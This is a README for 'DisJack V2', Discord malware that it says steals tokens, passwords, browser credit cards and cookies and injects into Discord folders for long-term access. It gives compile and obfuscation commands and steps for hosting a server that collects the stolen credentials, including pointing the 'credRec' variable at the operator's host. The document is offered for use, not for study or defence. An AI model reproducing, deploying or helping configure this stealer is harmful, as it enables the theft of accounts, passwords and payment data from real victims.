# DisJack V2
Malware for Discord, designed to steal passwords, tokens, and inject discord folders for long-term use. 

## What does this do?
This virus has the ability to steal Discord Tokens, Passwords, Browser Credit Cards, Browser Cookies, and other information.

This **IS** being updated so more will be added soon.

### What is the server for?
The server is for catching credit card details and passwords


## How to compile
```bash
python3 -m pip install pyinstaller
pyarmor pack main.py --output DisJack.exe
```
### Server Setup

#### Windows
1. Download XAMPP from [here](https://www.apachefriends.org/xampp-files/7.3.30/xampp-windows-x64-7.3.30-0-VC15-installer.exe)

2. Move server files into `C:\xampp\htdocs`

3. Port forward or use ngrok ([tutorial for ngrok](https://www.sitepoint.com/use-ngrok-test-local-site/))

4. Change the `credRec = ''` and put your IP/Webhost into the quotes *ex. `credRec = 'https://192.168.1.1/'`*

5. Compile and start beaming

#### Linux
1. Move all server files to html `/home/var/www/html/`
```bash
sudo apt-get updatesudo apt-get install apache2
sudo service apache2 restart
```



## Debug Output
<img src="https://transfer.sh/FYrksy/WindowsTerminal_RYcy9mjnS6.png">
